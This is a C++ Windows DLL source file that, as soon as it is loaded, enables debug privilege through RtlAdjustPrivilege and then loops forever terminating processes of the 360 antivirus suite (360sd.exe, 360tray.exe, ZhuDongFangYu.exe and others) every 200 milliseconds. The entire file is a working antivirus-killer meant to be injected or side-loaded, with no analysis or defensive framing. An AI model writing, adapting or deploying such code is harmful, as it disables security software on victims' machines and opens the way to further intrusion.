#include <windows.h>
#include <DbgHelp.h>
#include <stdio.h>
#include <TlHelp32.h>
#pragma comment(lib,"Dbghelp.lib")

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable,
    BOOL CurrentThread, PULONG Enabled);

char* WcharToChar(wchar_t* wc)
{
    char* m_char;
    int len = WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), NULL, 0, NULL, NULL);
    m_char = new char[len + 1];
    WideCharToMultiByte(CP_ACP, 0, wc, wcslen(wc), m_char, len, NULL, NULL);
    m_char[len] = '\0';
    return m_char;
}

DWORD ID(const char* pName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) {
        return NULL;
    }
    PROCESSENTRY32 pe = { sizeof(pe) };
    for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
        if (strcmp(WcharToChar(pe.szExeFile), pName) == 0) {
            CloseHandle(hSnapshot);
            return pe.th32ProcessID;
        }
    }
    CloseHandle(hSnapshot);
    return 0;
}

BOOL TerminateProcessFromId(DWORD pid)
{
    HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL)
    {
        printf("openprocess failed...");
        return FALSE;
    }

    BOOL bRet = ::TerminateProcess(hProcess, 0);
    if (bRet == 0) //failed
    {
        DWORD dwErr = ::GetLastError();
        printf("ERROR:error no is :%d\n", dwErr);
        return FALSE;
    }
    return TRUE;
}

int AAA() {

    _RtlAdjustPrivilege RtlAdjustPrivilege;
    ULONG               t;

    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

    // try enable debug privilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);

    
    while (TRUE)
    {
        TerminateProcessFromId(ID("360rp.exe"));
        TerminateProcessFromId(ID("360rps.exe"));
        TerminateProcessFromId(ID("360sd.exe"));
        TerminateProcessFromId(ID("360tray.exe"));
        TerminateProcessFromId(ID("ZhuDongFangYu.exe"));
        Sleep(200);
    }
    return 0;

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        AAA();
        break;
    case DLL_THREAD_ATTACH:
        AAA();
        break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
